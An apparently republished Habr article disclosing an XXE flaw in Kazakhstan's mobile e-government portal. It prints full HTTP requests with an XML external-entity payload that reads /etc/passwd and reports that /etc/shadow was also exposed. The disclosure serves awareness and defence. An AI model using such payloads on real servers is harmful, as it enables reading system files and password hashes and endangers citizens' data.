<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Old-new holes of e-Government of Kazakhstan</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="DISCLAMER! 
 The vulnerability described in the article has been fixed and does not pose any danger. The publication is written for the purpose of aca...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Old-new holes of e-Government of Kazakhstan</h1><div class="post__text post__text-html js-mediator-article">  DISCLAMER! <br><blockquote>  The vulnerability described in the article has been fixed and does not pose any danger.  The publication is written for the purpose of academic education of readers and demonstrate the importance of information security issues.  The described vulnerability was present at E-GOV for several years and allowed access to passwords of users of e-government in Kazakhstan. </blockquote>  Recently on the portal of the electronic government of the Republic of Kazakhstan, egov.kz closed a critical vulnerability.  Since the bug is already closed and its disclosure is no longer a threat, it was decided to discuss it with you, since from a technical and academic point of view the case is of great interest to researchers.  Another important point: in certain circles, such errors, particularly this one, are known for a very long time, and their presence raises many questions to the level of competence of the responsible persons. <br><br>  Those who always use web-services through a proxy to control data exchange, could notice in the mobile version of the site egov.kz requests sent to the server in the form of XML.  Many researchers have tried to load an entity into a query, or, in simple language, conduct an attack like XXE. <br><a name="habracut"></a><br>  The request looked like this: <br><br><pre><code class="hljs perl">POST http:<span class="hljs-regexp"><span class="hljs-regexp">//m</span></span>.egov.kz/cdb-adapter/mobilecitizen/update HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: m.egov.kz X-Egov-Mobile-Sso:************************************ Content-Type:application/json code:******************************************** Content-Type: application/json;charset=UTF-<span class="hljs-number"><span class="hljs-number">8</span></span> Content-Length: <span class="hljs-number"><span class="hljs-number">926</span></span> {<span class="hljs-string"><span class="hljs-string">"iin"</span></span>:<span class="hljs-string"><span class="hljs-string">"************"</span></span>,<span class="hljs-string"><span class="hljs-string">"msisdn"</span></span>:<span class="hljs-string"><span class="hljs-string">"***********"</span></span>,<span class="hljs-string"><span class="hljs-string">"requestXml"</span></span>:<span class="hljs-string"><span class="hljs-string">"%3Cns3%3AupdateRequest%20xmlns%3Ans2%3D%5C%22http%3A%2f%2fwww.w3.org%2f2000%2f09%2fxmldsig%23%5C%22%20xmlns%3Ans3%3D%5C%22http%3A%2f%2fmgov.bee.kz%2fmbc%2fv6%5C%22%3E%3Ciin%3E************%3C%2fiin%3E%3Cphone%3E***********%3C%2fphone%3E%3CotpCode%3E000%3C%2fotpCode%3E%3CdeviceInfo%3E%3CdateOfInstallation%3E2016-06-23%3C%2fdateOfInstallation%3E%3CappId%***** ************************************************** ************************************************** *************************************%3C%2fappId%3E%3 Cimei%3E%3C%2fimei%3E%3CoperatingSystem%3EANDROID%3C %2foperatingSystem%3E%3CosVersion%3E5.1.1%3C%2fosVersion %3E%3CsmsChannel%3Etrue%3C%2fsmsChannel%3E%3CpushChannel %3Etrue%3C%2fpushChannel%3E%3C%2fdeviceInfo%3E%3C%2fns3%3AupdateRequest%3E"</span></span>}</code> </pre> <br>  After making the changes, it looked like this: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="hljs perl">POST http:<span class="hljs-regexp"><span class="hljs-regexp">//m</span></span>.egov.kz/cdb-adapter/mobilecitizen/update HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: m.egov.kz X-Egov-Mobile-Sso:************************************ Content-Type:application/json code:******************************************** Content-Type: application/json;charset=UTF-<span class="hljs-number"><span class="hljs-number">8</span></span> Content-Length: <span class="hljs-number"><span class="hljs-number">926</span></span> {<span class="hljs-string"><span class="hljs-string">"iin"</span></span>:<span class="hljs-string"><span class="hljs-string">"************"</span></span>,<span class="hljs-string"><span class="hljs-string">"msisdn"</span></span>:<span class="hljs-string"><span class="hljs-string">"***********"</span></span>,<span class="hljs-string"><span class="hljs-string">"requestXml"</span></span>:<span class="hljs-string"><span class="hljs-string">"%3C%21DOCTYPE%20foo%20%5B %3C%21ENTITY%20xxe%20SYSTEM%20%5C%22file%3A%2f%2f%2fetc%2fpasswd%5C%22%3E% 20%5D%3E%3Cns3%3AupdateRequest%20xmlns%3Ans2%3D%5C%22http%3A%2f%2fwww.w3.or g%2f2000%2f09%2fxmldsig%23%5C%22%20xmlns%3Ans3%3D%5C%22http%3A%2f%2fmgov.be e.kz%2fmbc%2fv6%5C%22%3E%3Ciin%3E************%26xxe%3B%3C%2fiin%3E%3Cphone% 3E7**********%3C%2fphone%3E%3CotpCode%3E000%3C%2fotpCode%3E%3CdeviceInfo%3E%3 CdateOfInstallation%3E2016-**-**%3C%2fdateOfInstallation%3E%3CappId%******************************************** ********************************************************************************* *****************%3C%2fappId%3E%3Cimei%3E%3C%2fimei%3E%3CoperatingSystem%3EAN DROID%3C%2foperatingSystem%3E%3CosVersion%3E5.1.1%3C%2fosVersion%3E%3CsmsChannel %3Etrue%3C%2fsmsChannel%3E%3CpushChannel%3Etrue%3C%2fpushChannel%3E%3C%2f deviceInfo%3E%3C%2fns3%3AupdateRequest%3E"</span></span>}</code> </pre> <br>  To make it clearer, we will show the query in a readable form (the added data is highlighted): <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ns3:updateRequest</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:ns2</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">\</span></span></span><span class="hljs-tag">"</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">www.w3.org</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">2000</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">09</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmldsig</span></span></span><span class="hljs-tag">#\" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:ns3</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">\</span></span></span><span class="hljs-tag">"</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">mgov.bee.kz</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">mbc</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">v6</span></span></span><span class="hljs-tag">\"&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iin</span></span></span><span class="hljs-tag">&gt;</span></span>************<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;xxe <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iin</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">phone</span></span></span><span class="hljs-tag">&gt;</span></span>***********<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">phone</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">otpCode</span></span></span><span class="hljs-tag">&gt;</span></span>000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">otpCode</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">deviceInfo</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dateOfInstallation</span></span></span><span class="hljs-tag">&gt;</span></span>2016-**-**<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dateOfInstallation</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">appId</span></span></span><span class="hljs-tag">&gt;</span></span>************************************************************* ********************************************************************* **********<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">appId</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">imei</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">imei</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">operatingSystem</span></span></span><span class="hljs-tag">&gt;</span></span>ANDROID<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">operatingSystem</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">osVersion</span></span></span><span class="hljs-tag">&gt;</span></span>5.1.1<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">osVersion</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">smsChannel</span></span></span><span class="hljs-tag">&gt;</span></span>true<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">smsChannel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pushChannel</span></span></span><span class="hljs-tag">&gt;</span></span>true<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pushChannel</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">deviceInfo</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ns3:updateRequest</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  As you can see, the file / etc / passwd was requested and, to the surprise of the researchers, the contents were received in response (screen shot): <br><br><img src="https://habrastorage.org/webt/dt/sm/mh/dtsmmh-fuolbeuj2sezyfnpoluq.png"><br><br>  Explaining in a simple language, the vulnerability allowed to read local server files, including the / etc / passwd file.  In addition to reading files, the vulnerability allowed viewing the contents of directories (a screenshot is also attached). <br><br><img src="https://habrastorage.org/webt/mb/2w/hu/mb2whu4e97gfym4_qpdc0a4bgl0.png"><br><br>  Especially gifted researchers used scripts for convenient work with vulnerability. <br><br><img src="https://habrastorage.org/webt/np/s4/lf/nps4lfdrylqg3zjxecm5zo4wafy.png"><br><br>  The indescribable surprise of the researchers caused the ability to read the file / etc / shadow - the file contains user password hashes, usually accessible only to privileged users. <br><br><img src="https://habrastorage.org/webt/m2/qt/cs/m2qtcscacphxcxdu32hud0r4sg0.png"><br><br>  All this suggests that services work with maximum privileges, this is very, very bad! <br><br>  But there is good news: the vulnerability in question is finally closed (well, as closed, just put a WAF that blocks everything).  So now the data of the server, and with it the data of the citizens of Kazakhstan, are leaking to the Internet more slowly, if they have not yet flowed away. <br><br>  PS: The bug is not exactly corrected, it is relevant, but left behind the firewall </div><p>Source: <a href="https://habr.com/ru/post/347842/">https://habr.com/ru/post/347842/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../347832/index.html">How multichannel phone numbers work</a></li>
<li><a href="../347834/index.html">Anatomy of a thousand fonts</a></li>
<li><a href="../347836/index.html">Object in a case or Optional in Java 8 and Java 9. Part 4: ‚ÄúHow to close a hole in Java with a double bottom case‚Äù</a></li>
<li><a href="../347838/index.html">How we manage data quality</a></li>
<li><a href="../347840/index.html">Android Application Development: Start Your Career</a></li>
<li><a href="../347844/index.html">DCShadow - Active Directory Attack Technique</a></li>
<li><a href="../347846/index.html">The book "Microservices on the .NET platform"</a></li>
<li><a href="../347848/index.html">Blockchain - the future of financial technology?</a></li>
<li><a href="../347852/index.html">Web development experience when making a ‚ÄúMake a Word‚Äù game</a></li>
<li><a href="../347854/index.html">Special projects at Sberbank Technologies: how banks are preparing Hadoop, Spark, Kafka and other Big Data</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>